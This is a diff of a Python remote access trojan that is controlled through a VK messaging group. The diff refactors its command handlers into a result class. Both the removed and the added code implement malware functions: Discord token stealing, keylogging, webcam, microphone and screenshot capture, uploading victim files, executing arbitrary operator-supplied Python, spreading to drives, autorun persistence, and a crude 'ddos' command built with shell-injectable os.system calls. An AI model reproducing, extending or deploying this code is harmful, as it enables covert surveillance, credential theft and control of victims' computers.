@@ -1,9 +1,9 @@
 # -*- coding: utf-8 -*-
 
 """
-Remote Access Tool
-Author: Kirill Zhosul.
-https://github.com/kirillzhosul/python-remote-access
+    Remote Access Tool
+    Author: Kirill Zhosul.
+    https://github.com/kirillzhosul/python-remote-access
 """
 
 # Default modules.
@@ -16,8 +16,8 @@ import shutil  # Copy files.
 import atexit  # At exit handler.
 import sys  # System interaction (argv, platform).
 import threading  # Threading for message showing (blocking operation).
-import datetime  # Datetime for alive command.
 import re  # Expressions for discord.
+import datetime  # Dates for file properties
 
 # If true, show debug messages in console.
 DEBUG = True
@@ -123,6 +123,7 @@ keylogger_buffer: str = ""
 # `python` command output container.
 out = None
 
+
 # Server.
 # Function: server_connect()
 
@@ -133,635 +134,69 @@ server_api = None
 server_longpoll = None
 
 
-def command_taskkill(_arguments, _event) -> str:
-    # @function command_taskkill()
-    # @returns str
-    # @description Function for command "taskkill" that kills process.
-
-    # Calling system.
-    _system_result = os.system(f"taskkill /F /IM {_arguments}")
-
-    if _system_result == SYSTEM_OK_STATUS_CODE:
-        # If result is OK.
-
-        # Returning success.
-        return "Killed task!"
-
-    # Returning error.
-    return "Unable to kill this task!"
-
-
-def command_upload(_arguments, _event) -> str:
-    # @function command_upload()
-    # @returns str
-    # @description Function for command "upload" that uploads file on the client PC.
-
-    # Returning message.
-    return ""
-
-
-def command_properties(_arguments, _event) -> str:
-    # @function command_properties()
-    # @returns str
-    # @description Function for command "properties" that returns properties of the file.
-
-    if os.path.exists(_arguments):
-        # If path exists.
-
-        # Getting size.
-        _property_size = f"{filesystem_get_size(_arguments)}MB"
-
-        # Getting type.
-        _property_type = filesystem_get_type(_arguments)
-
-        # Getting time properties.
-        _property_created_at = os.path.getctime(_arguments)
-        _property_accessed_at = os.path.getatime(_arguments)
-        _property_modified_at = os.path.getmtime(_arguments)
-
-        # Returning properties.
-        return f"Path: {_arguments},\n" \
-               f"Size: {_property_size},\n" \
-               f"Type: {_property_type},\n" \
-               f"Modified: {_property_modified_at},\n" \
-               f"Created: {_property_created_at},\n" \
-               f"Accessed: {_property_accessed_at}."
-
-    # Error.
-    return "Path does not exists!"
-
-
-def command_download(_arguments, _event) -> typing.List:
-    # @function command_download()
-    # @returns str
-    # @description Function for command "download" that downloads files.
-
-    if os.path.exists(_arguments):
-        # If path exists.
-        if os.path.isfile(_arguments):
-            # If this is file.
-
-            if filesystem_get_size(_arguments) < 1536:
-                # If file is below need size.
-
-                # Uploading.
-                return [_arguments, "Download", "doc"]  # noqa
-
-            # If invalid size.
-            return "Too big file! Maximal size for download: 1536MB(1.5GB)"  # noqa
-        elif os.path.isdir(_arguments):
-            # If this is directory.
-
-            if filesystem_get_size(_arguments) < 1536:
-                # If file is below need size.
-
-                # Uploading.
-                return "Directories are not allowed for now!"  # noqa
-
-            # If invalid size.
-            return "Too big file! Maximal size for download: 1536MB(1.5GB)"  # noqa
-
-    # Error.
-    return "Path does not exists"  # noqa
-
-
-def command_ddos(_arguments, _event) -> str:
-    # @function command_ddos()
-    # @returns str
-    # @description Function for command "ddos" that starts ddos.
-
-    # Getting arguments.
-    _arguments = _arguments.split(";")
-
-    if len(_arguments) >= 1:
-        # If arguments OK.
-
-        if len(_arguments) > 2 and _arguments[2] == "admin":
-            # If admin.
-
-            # Pinging from admin.
-            os.system(f"ping -c {_arguments[0]} {_arguments[1]}")
-
-            # Message.
-            return "Completed DDoS (Admin)"
-
-        # Pinging from user.
-        os.system(f"ping {_arguments[0]}")
-
-        # Message.
-        return "Completed DDoS (User)"
-
-    # Message.
-    return "Incorrect arguments! Example: address;time;admin"
-
-
-def command_ls(arguments, _event) -> str:
-    # @function command_ls()
-    # @returns str
-    # @description Function for command "str" that lists all files in directory.
-
-    # Returning.
-    return ", ".join(filesystem_try_listdir(arguments if arguments != "" else current_directory))
-
-
-def command_cd(_arguments, _event) -> str:
-    # @function command_cd()
-    # @returns str
-    # @description Function for command "cd" that changes directory.
-
-    # Globalising current directory.
-    global current_directory
-
-    if os.path.exists(current_directory + "\\" + _arguments):
-        # If this is local folder.
-
-        # Changing.
-        current_directory += _arguments
-
-        # Message.
-        return f"Changed directory to {current_directory}"
-    else:
-        # If not local path.
-        if os.path.exists(_arguments):
-            # If path exists - moving there.
-
-            # Changing.
-            current_directory = _arguments
-
-            # Message.
-            return f"Changed directory to {current_directory}"
-
-        # Message.
-        return f"Directory {_arguments} does not exists!"
-
-
-def command_location(_arguments, _event) -> str:
-    # @function command_location()
-    # @returns str
-    # @description Function for command "location" that returns location of the PC.
-
-    # Getting ip data.
-    _ip = get_ip()
-
-    if "ip" in _ip and "city" in _ip and "country" in _ip and "region" in _ip and "org" in _ip:
-        # If correct fields.
-
-        # Getting ip data.
-        _ipaddress = _ip["ip"]  # noqa
-        _ipcity = _ip["city"]  # noqa
-        _ipcountry = _ip["country"]  # noqa
-        _ipregion = _ip["region"]  # noqa
-        _ipprovider = _ip["org"]  # noqa
-
-        # Returning.
-        return f"IP: {_ipaddress}," \
-               f"\nCountry: {_ipcountry}," \
-               f"\nRegion: {_ipregion}," \
-               f"\nCity: {_ipcity}," \
-               f"\nProvider: {_ipprovider}."
-
-    # Returning error.
-    return "Couldn't get location"
-
-
-def command_microphone(_arguments, _event) -> typing.List:
-    # @function command_microphone()
-    # @returns str
-    # @description Function for command "microphone" that returns voice message with the microphone.
-
-    try:
-        # Trying to import modules.
-
-        # Importing.
-        import pyaudio
-        import wave
-    except ImportError:
-        # If there is import error.
-
-        # Not supported.
-        return "This command does not supported on selected PC! (pyaduio/wave module is not installed)"  # noqa
-
-    # Getting path.
-    _path = folder + "Microphone.wav"
-
-    # Recording.
-    record_microphone(_path, _arguments)
-
-    # Message with uploading.
-    return [_path, "Microphone", "audio_message"]
-
-
-def command_help(_arguments, _event) -> str:
-    # @function command_help()
-    # @returns str
-    # @description Function for command "help" that returns list of all commands.
-
-    # Getting arguments.
-    _arguments = _arguments.split(";")
-
-    if len(_arguments) > 0 and _arguments[0] != "":
-        # If command given.
-
-        # Getting command.
-        _help_command = _arguments[0]
-
-        if _help_command not in commands_help:
-            # If command not exists.
-
-            # Error.
-            return f"Command {_help_command} not exists!"
-
-        # Help information.
-        _help_information = commands_help[_help_command]
-
-        # Returning information.
-        return f"[{_help_command}]:\n-- {_help_information[0]}\n--(Use: {_help_information[1]})"
-
-    # Help string.
-    _help = ""
-
-    for _command, _information in commands_help.items():
-        _help += f"[{_command}]: \n--{_information[0]}\n-- (Use: {_information[1]})\n"
-
-    # Returning.
-    return _help  # noqa
-
-
-def command_tags_new(_arguments, _event) -> str:
-    # @function command_tags_new()
-    # @returns str
-    # @description Function for command "tags_new" that replaces tags.
-
-    # Globalising tags
-    global client_tags
-
-    # Clearing tags list.
-    client_tags = []
-
-    # Getting arguments.
-    _arguments = _arguments.split(";")
-
-    if len(_arguments) == 0:
-        # If no arguments.
-
-        # Message.
-        return "Incorrect arguments! Example: (tags separated by ;)"
-
-    # Tags that was added.
-    _new_tags = []
-
-    for _tag in _arguments:
-        # For tags in arguments.
-
-        # Getting clean tag.
-        _clean_tag = _tag.replace(" ", "-")
-
-        # Adding it.
-        _new_tags.append(_clean_tag)
-
-    if len(_new_tags) != 0:
-        # If tags was added.
-
-        # Replacing tags.
-        client_tags = []
-
-        # Adding new tags
-        client_tags.extend(_new_tags)
-
-        # Saving tags.
-        save_tags()
-
-        # Message.
-        return f"Added new tags: {_new_tags}"
-    else:
-        # Message.
-        return "Replacing was not completed! No tags passed!"
-
-
-def command_tags_add(_arguments: str, _event) -> str:
-    # @function command_tags_add()
-    # @returns str
-    # @description Function for command "tags_add" that add tags.
-
-    # Getting arguments.
-    _arguments = _arguments.split(";")
-
-    if len(_arguments) == 0:
-        # If no arguments.
-
-        # Message.
-        return "Incorrect arguments! Example: (tags separated by ;)"
-
-    # Globalising tags.
-    global client_tags
-
-    # Tags that was added.
-    _new_tags = []
-
-    for _tag in _arguments:
-        # For tags in arguments.
-
-        # Getting clean tag.
-        _clean_tag = _tag.replace(" ", "-")
-
-        # Adding it.
-        client_tags.append(_clean_tag)
-        _new_tags.append(_clean_tag)
-
-    # Saving tags.
-    save_tags()
-
-    # Message.
-    return f"Added new tags: {_new_tags}"
-
-
-def command_message(_arguments: str, _event) -> str:
-    # @function command_message()
-    # @returns str
-    # @description Function for command "message" that shows message.
-
-    try:
-        # Trying to import module.
-
-        # Importing module.
-        import ctypes
-    except ImportError:
-        # If there is import error.
-
-        # Not supported.
-        return "This command does not supported on selected PC! (ctypes module is not installed)"  # noqa
-
-    # Getting arguments.
-    _arguments = _arguments.split(";")
-
-    # Passing arguments.
-    if len(_arguments) == 0:
-        # If there is no arguments.
-
-        # Message
-        return "Incorrect arguments! Example: text;title;style"
-
-    if len(_arguments) == 1:
-        # If there is only text.
-
-        # Adding title.
-        _arguments.append("")
-
-    if len(_arguments) == 2:
-        # If there is only text and title.
-
-        #  Styles:
-        #  0 : OK
-        #  1 : OK | Cancel
-        #  2 : Abort | Retry | Ignore
-        #  3 : Yes | No | Cancel
-        #  4 : Yes | No
-        #  5 : Retry | Cancel
-        #  6 : Cancel | Try Again | Continue
-
-        # To also change icon, add these values to previous number
-        # 16 Stop-sign icon
-        # 32 Question-mark icon
-        # 48 Exclamation-point icon
-        # 64 Information-sign icon consisting of an 'i' in a circle
-        # Adding title.
-        _arguments.append(0)  # noqa
-
-    # Calling message.
-    try:
-        # Trying to show message.
-
-        # Thread function.
-        def __ctypes_message_thread():
-            ctypes.windll.user32.MessageBoxW(0, _arguments[0], _arguments[1], int(_arguments[2]))
-
-        # Creating thread.
-        _thread = threading.Thread(target=__ctypes_message_thread)
-
-        # Starting thread.
-        _thread.start()
-    except Exception as _exception:  # noqa
-        # If there is error.
-
-        # Message.
-        return f"Error when showing message! Error: {_exception}"
-
-    # Message.
-    return "Message was shown!"
-
-
-def command_webcam(_arguments, _event) -> typing.List:
-    # @function command_webcam()
-    # @returns list
-    # @description Function for command "webcam" that returns webcam photo.
-
-    try:
-        # Trying to import opencv-python.
-
-        # Importing.
-        import cv2
-    except ImportError:
-        # If there is import error.
-
-        # Not supported.
-        return "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)"  # noqa
-
-    # Globalising folder.
-    global folder
-
-    # Getting camera.
-    _camera = cv2.VideoCapture(0)
-
-    # Getting image.
-    _, _image = _camera.read()
-
-    # Getting path.
-    _path = folder + "webcam.png"
-
-    # Building path.
-    filesystem_build_path(_path)
-
-    # Writing file.
-    cv2.imwrite(_path, _image)
-
-    # Deleting camera.
-    del _camera
-
-    # Returning uploading.
-    return [_path, "Webcam", "photo"]
-
-
-def command_screenshot(_arguments, _event) -> typing.List:
-    # @function command_screenshot()
-    # @returns list
-    # @description Function for command "screenshot" that returns screenshot.
-
-    try:
-        # Trying to import.
-
-        # Importing.
-        import PIL.ImageGrab
-    except ImportError:
-        # If there is import error.
-
-        # Not supported.
-        return "This command does not supported on selected PC! (Pillow module is not installed)"  # noqa
-
-    # Taking screenshot.
-    screenshot = PIL.ImageGrab.grab()
-
-    # Getting path.
-    _path = folder + "Screenshot.jpg"
-
-    # Saving it.
-    screenshot.save(_path)
-
-    # Message with uploading.
-    return [_path, "Screenshot", "photo"]
-
-
-def command_python(arguments, event) -> str:
-    # @function command_python()
-    # @returns str
-    # @description Function for command "python" that executes python code.
-
-    # Executing.
-    return execute_python(arguments, globals(), locals())
-
-
-def command_tags(_arguments, _event) -> str:
-    # @function command_tags()
-    # @returns str
-    # @description Function for command "tags" that returns all tags.
-
-    # Returning.
-    return str(", ".join(client_tags))
-
-
-def command_version(_arguments, _event) -> str:
-    # @function command_version()
-    # @returns str
-    # @description Function for command "version" that returns current version.
-
-    # Returning.
-    return VERSION
-
-
-def command_name_new(_arguments, _event) -> str:
-    # @function command_name_new()
-    # @returns str
-    # @description Function for command "name_new" that changes name to other.
-
-    # Global name.
-    global client_name
-
-    if type(_arguments) == str and len(_arguments) > 0:
-        # If correct arguments.
-
-        # Changing name.
-        client_name = _arguments
-
-        # Saving name
-        save_name()
-        # Returning.
-        return f"Name changed to {client_name}"
-    else:
-        # If name is not valid.
-
-        # Returning.
-        return f"Invalid name!"
-
-
-def command_destruct(_arguments, _event) -> str:
-    # @function command_destruct()
-    # @returns str
-    # @description Function for command "destruct" that destroys self from the system.
-
-    # Unregistering from the autorun.
-    autorun_unregister()
-
-    # Removing working folder path.
-    filesystem_try_delete(folder)
-
-    # Exiting.
-    return command_exit(_arguments, _event)
-
-
-def command_keylog(_arguments, _event) -> str:
-    # @function command_keylog()
-    # @returns str
-    # @description Function for command "keylog" that returns keylog string.
-
-    # Returning.
-    return keylogger_buffer
-
-
-def command_link(_arguments, _event) -> str:
-    # @function command_link()
-    # @returns str
-    # @description Function for command "link" that opens link in the browser.
-
-    try:
-        # Trying to open with the module.
-
-        # Importing module.
-        import webbrowser
-
-        # Opening link.
-        webbrowser.open(_arguments)
-
-        # Message.
-        return "Link was opened (Via module)!"
-    except ImportError:
-        # If there is ImportError.
-
-        # Opening with system.
-        os.system("open {_arguments}")
-
-        # Message.
-        return "Link was opened (Via system)!"
-
-
-def command_drives(_arguments: str, _event) -> str:
-    # @function command_drives()
-    # @returns Str
-    # @description Function for command "drive" that returns list of the all drives in the system separated by ,(comma).
-
-    # Returning.
-    return ", ".join(filesystem_get_drives_list())
-
-
-def command_discord_tokens(_arguments: str, _event) -> str:
-    """ Command "discord_tokens" that returns list of the all discord tokens founded in system ,(comma). """
-
-    # Getting tokens.
-    _tokens = stealer_steal_discord_tokens()
-
-    if len(_tokens) == 0:
-        # If not found any tokens.
-
-        # Error.
-        return "Tokens not found in system!"
-
-    # Returning.
-    return ",\n".join(_tokens)
-
-
-def command_discord_profile_raw(_arguments: str, _event) -> str:
-    """ Сommand "discord_profile" that returns information about discord found in system(as raw dict). """
-
-    # Getting tokens.
-    _tokens = stealer_steal_discord_tokens()
-
-    if len(_tokens) == 0:
-        # If not found any tokens.
-
-        # Error.
-        return "Tokens not found in system!"
-
-    # Returning.
-    return json.dumps(stealer_steal_discord_profile(_tokens), indent=2)
-
+class CommandResult:
+    """ Command result class that implements result of the command container. """
+
+    # Text to send.
+    __text: typing.Optional[str] = None
+
+    # Attachment to send.
+    __attachment: typing.Optional[typing.Tuple[str, str, str]] = None
+
+    # Flag to delete after uploading.
+    __attachment_delete_after_uploading = True
+
+    def __init__(self, text=None):
+        """
+        Constructor.
+        :param text: Text to send.
+        """
+
+        if text is not None:
+            # Create from text if there text given.
+            self.from_text(text)
+
+    def from_text(self, text: str) -> None:
+        """
+        Creates command result from text.
+        :param text: Text to send.
+        """
+
+        # Set text.
+        self.__text = text
+
+        # Reset Attachment.
+        self.__attachment = None
+
+    def from_attachment(self, path: str, title: str, type_: str) -> None:
+        """
+        Creates command result from attachment.
+        :param path: Path to upload.
+        :param title: Title for attachment.
+        :param type_: Type of the document ("doc", "audio_message", "photo")
+        """
+
+        # Reset text.
+        self.__text = None
+
+        # Set attachment.
+        self.__attachment = (path, title, type_)
+
+    def get_text(self):
+        """ Text getter. """
+        return self.__text
+
+    def get_attachment(self):
+        """ Attachment getter. """
+        return self.__attachment
+
+    def disable_delete_after_uploading(self):
+        """ Disables deletion after uploading. """
+        self.__attachment_delete_after_uploading = False
+
+    def should_delete_after_uploading(self):
+        """ Returns should we delete file after uploading. """
+        return self.__attachment_delete_after_uploading
 
 def spreading_infect_drive(_drive: str) -> None:
     # @function spreading_infect_drive()
@@ -812,8 +247,6 @@ def spreading_infect_drive(_drive: str) -> None:
         # Showing debug message to the developer.
         debug_message(f"Oops... Exception occurred in function spreading_infect_drive()! "
                       f"Full exception information - {_exception}")
-
-
 def spreading_thread() -> None:
     # @function spreading_thread()
     # @returns None
@@ -868,8 +301,6 @@ def spreading_thread() -> None:
         # Showing debug message to the developer.
         debug_message(f"Oops... Exception occurred in function spreading_thread()! "
                       f"Full exception information - {_exception}")
-
-
 def spreading_start() -> None:
     # @function spreading_start()
     # @returns None
@@ -883,8 +314,6 @@ def spreading_start() -> None:
 
     # Starting listening drives.
     threading.Thread(target=spreading_thread).start()
-
-
 def assert_operating_system() -> None:
     # @function assert_operating_system()
     # @returns None
@@ -922,8 +351,6 @@ def assert_operating_system() -> None:
 
     # Raising SystemExit (Exiting code)
     raise SystemExit
-
-
 def save_name() -> None:
     # @function save_name()
     # @returns None
@@ -933,7 +360,7 @@ def save_name() -> None:
         # Trying to save name.
 
         # Getting path.
-        _path = folder + "name.dat"
+        _path = folder + config["paths"]["name"]
 
         # Building path.
         filesystem_build_path(_path)
@@ -949,8 +376,6 @@ def save_name() -> None:
         # Showing debug message to the developer.
         debug_message(f"Oops... Exception occurred in function save_name()! "
                       f"Full exception information - {_exception}")
-
-
 def load_name() -> None:
     # @function load_name()
     # @returns None
@@ -963,12 +388,12 @@ def load_name() -> None:
         # Trying to load name.
 
         # Getting path.
-        _path = folder + "name.dat"
+        path = folder + config["paths"]["name"]
 
         # Building path.
-        filesystem_build_path(_path)
+        filesystem_build_path(path)
 
-        if os.path.exists(_path):
+        if os.path.exists(path):
             # If we have name file.
 
             try:
@@ -977,7 +402,7 @@ def load_name() -> None:
                 # Clearing name.
                 client_name = ""
 
-                with open(_path, "r", encoding="UTF-8") as _nf:
+                with open(path, "r", encoding="UTF-8") as _nf:
                     # With opened file.
 
                     # Reading name.
@@ -989,7 +414,7 @@ def load_name() -> None:
                 debug_message(f"Can`t load name file! Exception: {exception}")
 
                 # Name.
-                client_name = get_ip()["ip"]  # noqa
+                client_name = get_ip()["ip"]
 
                 # Saving name.
                 save_name()
@@ -997,7 +422,7 @@ def load_name() -> None:
             # If we don't have name file.
 
             # Name.
-            cleint_name = get_ip()["ip"]  # noqa
+            client_name = get_ip()["ip"]
 
             # Saving name.
             save_name()
@@ -1009,9 +434,7 @@ def load_name() -> None:
                       f"Full exception information - {_exception}")
 
         # Name.
-        cleint_name = get_ip()["ip"]  # noqa
-
-
+        client_name = get_ip()["ip"]  # noqa
 def stealer_steal_data(_force: bool = False):
     # @function stealer_steal_data()
     # @returns None
@@ -1026,7 +449,7 @@ def stealer_steal_data(_force: bool = False):
             # If we not already stolen data or forcing.
 
             # Getting file name.
-            _path = folder + "log.json"
+            _path = folder + config["paths"]["log"]
 
             # Getting ip data.
             _ip = get_ip()
@@ -1036,11 +459,11 @@ def stealer_steal_data(_force: bool = False):
             _drive = os.getcwd().split("\\")[0]
 
             # Writing values.
-            data["internet_ipaddress"] = _ip["ip"]  # noqa
-            data["internet_city"] = _ip["city"]  # noqa
-            data["internet_country"] = _ip["country"]  # noqa
-            data["internet_region"] = _ip["region"]  # noqa
-            data["internet_provider"] = _ip["org"]  # noqa
+            data["internet_ipaddress"] = _ip["ip"]
+            data["internet_city"] = _ip["city"]
+            data["internet_country"] = _ip["country"]
+            data["internet_region"] = _ip["region"]
+            data["internet_provider"] = _ip["org"]
 
             if FEATURE_STARTUP_HWID_GRABBING_ENABLED:
                 # If HWID is not disabled.
@@ -1109,168 +532,6 @@ def stealer_steal_data(_force: bool = False):
 
         # Returning value.
         return {_exception}
-
-
-def client_answer_server(event) -> None:
-    # @function client_answer_server()
-    # @returns None
-    # @description Function that process message from the remote access (server).
-
-    if config["server"]["type"] == "VK_GROUP":
-        message = event.message
-    else:
-        message = event
-
-    # Getting text from the event.
-    _text = message.text
-
-    # Getting peer from the event.
-    _peer = message.peer_id
-
-    # Text of the response.
-    _response_text = None
-
-    # Attachment of the response.
-    _response_attachment = None
-
-    try:
-        # Trying to answer.
-
-        # Getting arguments from the message (Message split by space).
-        _message_arguments = _text.split(";")
-
-        if len(_message_arguments) == 0:
-            # If empty.
-
-            # Returning.
-            return
-
-            # Getting tags.
-        _message_tags = _message_arguments[0]
-        _message_arguments.pop(0)
-
-        if _message_tags == "alive":
-            # If this is network command (That is work without tags and for all).
-
-            if peer_is_allowed(_peer):
-                # If peer is alowed
-
-                # Answering that we in network.
-                _response_text = command_alive("", event)
-            else:
-                # If not is admin.
-
-                # Answering with an error.
-                _response_text = "Sorry, but you don't have required permissions to make this command!"
-        else:
-            # If this is not alive command.
-
-            if list_intersects(parse_tags(_message_tags), client_tags):
-                # If we have one or more tag from our tags.
-
-                if peer_is_allowed(_peer):
-                    # If peer is allowed.
-
-                    if len(_message_arguments) == 0:
-                        # If there is no tags + command.
-
-                        # Responding with error.
-                        _response_text = "Invalid request! Message can`t be parsed! Try: tag1, tag2; command; args"
-                    else:
-                        # If there is no error.
-
-                        # Getting command itself.
-                        _message_command = str(_message_arguments[0]).lower().replace(" ", "")
-                        _message_arguments.pop(0)
-
-                        # Getting arguments (Joining all left list indices together).
-                        _command_arguments = ";".join(_message_arguments)
-
-                        # Executing command.
-                        _execution_response = execute_command(_message_command, _command_arguments, event)
-
-                        if type(_execution_response) == list:
-                            # If response is list.
-
-                            # Uploading attachment to the message.
-
-                            if len(_execution_response) < 3:
-                                # If invalid length.
-
-                                # Getting error response.
-                                _response_text = "Invalid attachment response from the executing of command!"
-                            else:
-                                # If all correct.
-
-                                # Uploading.
-
-                                # Getting values.
-                                _uploading_path = _execution_response[0]
-                                _uploading_title = _execution_response[1]
-                                _uploading_type = _execution_response[2]
-
-                                if _uploading_type == "photo":
-                                    # If this is just photo.
-
-                                    # Uploading photo on the server.
-                                    _uploading_result = server_upload_photo(_uploading_path)
-
-                                    # Moving result to attachment.
-                                    _response_text = _uploading_title
-                                    _response_attachment = _uploading_result
-                                elif _uploading_type in ("doc", "audio_message"):
-                                    # If this is document or audio message.
-
-                                    # Uploading file on the server.
-                                    _uploading_result = server_upload_document(_uploading_path, _uploading_title,
-                                                                               _peer, _uploading_type)
-
-                                    if type(_uploading_result) == str:
-                                        # If uploading file result is string then all OK.
-
-                                        # Setting response.
-                                        _response_text = _uploading_title
-                                        _response_attachment = _uploading_result
-                                    else:
-                                        # If there is an error.
-
-                                        # Setting response.
-                                        _response_text = f"Error when uploading document: {_uploading_result}"
-
-                                    # Trying to delete.
-                                    filesystem_try_delete(_uploading_path)
-                        else:
-                            # If default string response.
-                            # Getting text.
-                            _response_text = _execution_response
-                else:
-                    # If not is admin.
-
-                    # Answering with an error.
-                    _response_text = "Sorry, but you don't have required permissions to make this command!"
-            else:
-                # If lists of tags not intersects.
-
-                # Returning.
-                return
-    except Exception as _exception:  # noqa
-        # If there an exception.
-
-        # Getting exception answer.
-        _response_text = f"Oops... There is exception while client try to answer message. " \
-                         f"Exception information: {_exception}"
-
-    # Answering server.
-    if _response_text is not None:
-        # If response was not void from execution function.
-
-        # Answering.
-        server_message(f"{_response_text}", _response_attachment, _peer)
-    else:
-        # None answer.
-        server_message(f"Void... (No response)", _response_attachment, _peer)
-
-
 def server_upload_photo(_path: str) -> str:
     # @function server_upload_photo()
     # @returns str
@@ -1296,8 +557,6 @@ def server_upload_photo(_path: str) -> str:
 
     # Returning blank.
     return ""
-
-
 def execute_python(_code: str, _globals: typing.Dict, _locals: typing.Dict) -> any:
     # @function server_upload_photo()
     # @returns any
@@ -1334,7 +593,695 @@ def execute_python(_code: str, _globals: typing.Dict, _locals: typing.Dict) -> a
 
 # Commands.
 
-def command_discord_profile(*_) -> str:
+
+def command_screenshot(*_) -> CommandResult:
+    """ Command `screenshot` that returns screenshot image. """
+
+    try:
+        # Trying to import.
+
+        # Importing.
+        import PIL.ImageGrab
+    except ImportError:
+        # If there is import error.
+
+        # Not supported.
+        return CommandResult("This command does not supported on selected PC! (Pillow module is not installed)")
+
+    # Taking screenshot.
+    screenshot = PIL.ImageGrab.grab()
+
+    # Getting path.
+    path = folder + config["paths"]["screenshot"]
+
+    # Saving it.
+    screenshot.save(path)
+
+    # Create result.
+    result = CommandResult()
+    result.from_attachment(path, "Screenshot", "photo")
+
+    # Returning result.
+    return result
+
+
+def command_webcam(_arguments, _event) -> CommandResult:
+    """ Command `webcam` that returns webcam photo. """
+
+    try:
+        # Trying to import opencv-python.
+
+        # Importing.
+        import cv2
+    except ImportError:
+        # If there is import error.
+
+        # Not supported.
+        return CommandResult(
+            "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)")
+
+    # Getting camera.
+    camera = cv2.VideoCapture(0)
+
+    # Getting image.
+    _, image = camera.read()
+
+    # Getting path.
+    path = folder + config["paths"]["webcam"]
+
+    # Building path.
+    filesystem_build_path(path)
+
+    # Writing image file.
+    cv2.imwrite(path, image)
+
+    # Deleting camera.
+    del camera
+
+    # Creating result for attachment.
+    result = CommandResult()
+    result.from_attachment(path, "Webcam", "photo")
+
+    # Returning result.
+    return result
+
+
+def command_microphone(arguments, _) -> CommandResult:
+    """ Command `microphone` that records voice and sends it. """
+
+    try:
+        # Trying to import modules.
+
+        # Importing.
+        import pyaudio
+        import wave
+    except ImportError:
+        # If there is import error.
+
+        # Not supported.
+        return CommandResult("This command does not supported on selected PC! (pyaduio/wave module is not installed)")
+
+    # Getting path.
+    path = folder + config["paths"]["microphone"]
+
+    # Record with seconds or without if not passed.
+    try:
+        record_microphone(path, int(arguments))
+    except ValueError:
+        record_microphone(path)
+
+    # Create result with uploading.
+    result = CommandResult()
+    result.from_attachment(path, "Microphone", "audio_message")
+
+    # Returning result.
+    return result
+
+
+def command_download(arguments, _) -> CommandResult:
+    """ Command `download` that downloads file from client."""
+
+    # Get download path.
+    path = arguments.replace("\"", "").replace("\'", "")
+
+    if os.path.exists(path):
+        # If path exists.
+
+        if os.path.isfile(path):
+            # If this is file.
+
+            if filesystem_get_size(path) < 1536:
+                # If file is below need size.
+
+                # Create command result to upload file.
+                result = CommandResult()
+                result.from_attachment(path, os.path.basename(path), "doc")
+
+                # Disable file deletion after uploading."
+                result.disable_delete_after_uploading()
+
+                # Returning result.
+                return result
+
+            # If invalid size.
+            return CommandResult("Too big file to download! Maximal size for download: 1536MB (1.5GB)")
+        elif os.path.isdir(path):
+            # If this is directory.
+
+            if filesystem_get_size(path) < 1536:
+                # If file is below need size.
+
+                # Uploading.
+                return CommandResult("Directories downloading is not implemented yet!")
+
+            # If invalid size.
+            return CommandResult("Too big directory to download! Maximal size for download: 1536MB(1.5GB)")
+    else:
+        # If not exists.
+
+        if os.path.exists(folder + path):
+            # Try relative.
+
+            # Call for relative.
+            return command_download(folder + path, _)
+
+    # Error.
+    return CommandResult("Path that you want download does not exists")
+
+
+def command_message(arguments: str, _) -> CommandResult:
+    """ Command `message` that shows message. """
+
+    try:
+        # Trying to import module.
+
+        # Importing module.
+        import ctypes
+    except ImportError:
+        # If there is import error.
+
+        # Not supported.
+        return CommandResult("This command does not supported on selected PC! (ctypes module is not installed)")
+
+    # Getting arguments.
+    if (arguments := arguments.split(";")) and len(arguments) == 0:
+        # If there is no arguments.
+
+        # Message
+        return CommandResult("Incorrect arguments! Example: text;title;style")
+
+    # Calling message.
+    try:
+        # Trying to show message.
+
+        # Arguments check ([text: str, title: str, type: int])
+        message_parameters: typing.List[typing.Union[str, int]] = arguments
+
+        # Process optional parameters.
+        if len(arguments) <= 0:
+            # Text.
+            message_parameters.append("")
+        if len(arguments) <= 1:
+            # Title.
+            message_parameters.append("")
+        if len(arguments) <= 2:
+            # Type.
+            message_parameters.append(0)
+
+        # Convert type argument to integer.
+        message_parameters[2] = int(message_parameters[2])
+
+        # Creating thread.
+        threading.Thread(
+            # First argument, is hWND. That is not required.
+            #
+            target=lambda: ctypes.windll.user32.MessageBoxW(0, *message_parameters)
+        ).start()
+
+    except Exception as exception:  # noqa
+        # If there is error.
+
+        # Message.
+        return CommandResult(f"Error when showing message! Error: {exception}")
+
+    # Message.
+    return CommandResult("Message was shown!")
+
+
+def command_tags_new(arguments, _) -> CommandResult:
+    """ Command `tags_new` that replaces tags. """
+
+    if (arguments := arguments.split(";")) and len(arguments) == 0:
+        # If no arguments.
+
+        # Message.
+        return CommandResult("Incorrect arguments! Example: (tags separated by ;)")
+
+    # Tags that was added.
+    new_tags = list(set([tag.replace(" ", "-") for tag in arguments]))
+
+    if len(new_tags) != 0:
+        # If tags was added.
+
+        # Globalising tags
+        global client_tags
+
+        # Set new tags
+        client_tags = new_tags
+
+        # Saving tags.
+        save_tags()
+
+        # Message.
+        return CommandResult(f"Tags was replaced to: {';'.join(client_tags)}")
+
+    # Message.
+    return CommandResult("Tags replacing was not completed! No valid tags passed!")
+
+
+def command_tags_add(arguments: str, _) -> CommandResult:
+    """ Command `tags_add` that adds tags to current. """
+
+    if (arguments := arguments.split(";")) and len(arguments) == 0:
+        # If no arguments.
+
+        # Message.
+        return CommandResult("Incorrect tags arguments! Example: (tags separated by ;)")
+
+    # Globalising tags.
+    global client_tags
+
+    # Clean tags.
+    tags = [tag.replace(" ", "-") for tag in arguments]
+
+    # Add tags.
+    client_tags.extend(tags)
+
+    # Saving tags.
+    save_tags()
+
+    # Message.
+    return CommandResult(f"Added new tags: {';'.join(tags)}. Now tags is: {';'.join(client_tags)}")
+
+
+def command_help(arguments, _event) -> CommandResult:
+    """ Command `help` that shows help for all commands. """
+
+    # Getting arguments.
+    arguments = arguments.split(";")
+
+    if len(arguments) > 0 and arguments[0] != "":
+        # If command given.
+
+        # Getting command.
+        command = arguments[0]
+
+        if command not in commands_help:
+            # If command not exists.
+
+            # Error.
+            return CommandResult(f"Command {command} not exists!")
+
+        # Help information.
+        information, using = commands_help[command]
+
+        # Returning information.
+        return CommandResult(
+            f"[{command}]:\n"
+            f"* {information}\n"
+            f"* (Use: {using})"
+        )
+
+    # Help string.
+    help_string = ""
+
+    for command, information in commands_help.items():
+        # For all commands and they information.
+
+        # Decompose information.
+        information, using = information
+
+        # Add data.
+        help_string += f"[{command}]: \n" \
+                       f"--{information}\n" \
+                       f"-- (Use: {using})\n"
+
+    # Returning.
+    return CommandResult(help_string)
+
+
